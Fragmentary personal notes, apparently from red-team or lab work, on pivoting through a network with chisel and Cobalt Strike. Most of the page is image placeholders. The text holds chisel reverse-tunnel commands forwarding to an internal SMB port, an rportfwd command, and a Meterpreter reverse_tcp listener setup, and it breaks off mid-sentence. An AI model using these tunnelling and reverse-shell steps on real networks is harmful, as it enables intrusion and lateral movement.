https://ap3x.github.io/posts/pivoting-with-chisel/

![[Pasted image 20240304212735.png]]![[Pasted image 20240304212749.png]]
![[Pasted image 20240304212815.png]]
![[Pasted image 20240304212907.png]]
![[Pasted image 20240304212929.png]]
![[Pasted image 20240304212957.png]]
![[Pasted image 20240304213027.png]]


cobalt strike opens the port on the actual target, not the host.

# Things to try
- try tcpdump to monitor
![[Pasted image 20240304213658.png]]
- might be iptables messing up?

![[Pasted image 20240304214417.png]]
![[Pasted image 20240304213959.png]]



# PoC

put chisel onto DNS Server and DC.


MAINTAINER LAPTOP 
-> DNS SERVER 172.16.4.23 `chisel server -p 53 --reverse`
--> DC 172.16.4.11 (external IP) `chisel client 172.16.4.23:53 R:9292:172.16.5.194:445`



# Random Cobaltstrike to meterpreter notes


- Can also try Cobaltstrike to meterpreter, just make sure to 
	- wouldnt work because not opening actual local port, onl
![[Pasted image 20240304213137.png]]

beacon redirector in action with rportfwd


rportfwd 9292 172.16.5.194 9292
	- verify listening shell netstat -nao | findstr "9292"

In cobalt strike add a new listener 

Payload: windows/meterpreter/reverse_tcp
Host: 172.16.4.7/11
port: 9292

so now meterpreter is standing up a meterpreter handler on the teams server 172.16.5.194 (Teams server) on port 9292 but the listener is configured to call back to 